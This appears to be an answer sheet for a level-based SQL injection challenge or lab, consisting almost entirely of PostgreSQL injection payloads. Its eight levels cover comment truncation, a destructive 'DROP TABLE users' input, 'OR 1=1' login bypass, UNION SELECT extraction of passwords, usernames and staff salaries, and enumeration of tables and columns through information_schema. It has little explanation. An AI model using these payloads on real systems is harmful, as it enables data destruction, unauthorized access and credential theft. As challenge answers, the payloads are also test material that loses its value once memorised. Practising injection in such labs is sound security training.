
> [!NOTE] Note
> The first `'` is not part of the injected text, it's just there for syntax highlighting.

# Level 1

```postgresql
'jane';--
```

# Level 2

```postgresql
''; DROP TABLE users;--
```

# Level 3

```postgresql
'' OR 1=1; --
```

# Level 4

```postgresql
'' OR 1=1 LIMIT 1;--
```

# Level 5

```postgresql
'' UNION SELECT password, username FROM users;--
```

# Level 6

```postgresql
'' UNION
SELECT salary FROM staff
WHERE firstname LIKE '%_reta%'
LIMIT 1 OFFSET 0;--
```

> [!NOTE]- Get table metadata
>1. Get table names
>```postgresql
>'' UNION
>SELECT table_name
>FROM information_schema.tables
>LIMIT 1 OFFSET 0;--
>```
>
>2. Get columns of table
>```postgresql
>'' UNION
>SELECT column_name
>FROM information_schema.columns
>WHERE table_name='staff'
>LIMIT 1 OFFSET 0;--
>```

# Level 7

```postgresql
'' UNION SELECT name, email, salary, employed_since FROM staff--
```

# Level 8

```postgresql
'' UNION
SELECT table_name
FROM information_schema.tables;--
```